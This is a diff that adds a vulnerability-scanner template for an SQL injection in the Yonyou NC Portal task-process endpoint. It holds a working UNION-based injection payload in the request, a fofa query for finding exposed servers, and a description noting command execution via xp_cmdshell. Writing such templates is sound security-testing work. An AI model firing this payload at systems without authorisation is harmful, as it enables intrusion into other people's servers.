@@ -1,0 +1,30 @@
+id: yongyouNC-process-sql
+
+info:
+  name: "用友 NC Portal PT Task Process 接口 SQL 注入漏洞"
+  author: Unknown
+  severity: high
+  description: |-
+    fofa: icon_hash="1085941792"
+      用友NC Portal PT Task Process 接口存在SQL注入安全缺陷，攻击者可利用该缺陷通过调用xp_cmdshell存储过程执行系统命令，导致服务器被完全控制。经技术评估，该漏洞利用复杂度低且攻击可行性高，建议立即采取修复措施以降低风险。
+  reference:
+  - https://mp.weixin.qq.com/s/NOwfvKEm36O7mdlosmZxtQ?token=974751616&lang=zh_CN
+  tags: 用友NC
+
+
+http:
+- raw:
+  - |
+    GET /portal/pt/task/process?pageId=login&id=1&pluginid=1%27%20UNION%20ALL%20SELECT%20NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,CHR(113)||CHR(118)||CHR(98)||CHR(118)||CHR(113)||CHR(113)||CHR(107)||CHR(98)||CHR(106)||CHR(113),NULL,NULL,NULL,NULL,NULL,NULL%20FROM%20DUAL--%20 HTTP/1.1
+    Host: {{Hostname}}
+    User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/126.0.0.0 Safari/537.36
+
+  matchers-condition: and
+  matchers:
+  - type: word
+    part: body
+    words:
+    - 'qvbvqqkbjq'
+  - type: status
+    status:
+    - 200
